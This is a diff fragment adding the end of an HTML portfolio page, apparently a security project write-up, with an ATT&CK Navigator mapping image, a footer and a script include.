+      <div class="reveal">
+        <p style="font-size:0.8rem; color:var(--text-muted); margin-bottom:1rem;">ATT&CK Navigator Export</p>
+        <img class="mitre-img screenshot" src="assets/mitre.svg" alt="MITRE ATT&CK Navigator mapping" />
+       
+      </div>
+    </div>
+
+  </div>
+
+  <footer style="border-top:1px solid var(--border); padding:2rem 4rem; display:flex; justify-content:space-between; align-items:center; font-size:0.73rem; color:var(--text-muted); position:relative; z-index:1;">
+    <span>Ciprian Dumitru · 2026</span>
+    <a href="../../index.html" style="color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent)'" onmouseout="this.style.color='var(--text-muted)'">← Back to Portfolio</a>
+  </footer>
+
+  <script src="js/main.js"></script>
+</body>
+</html>
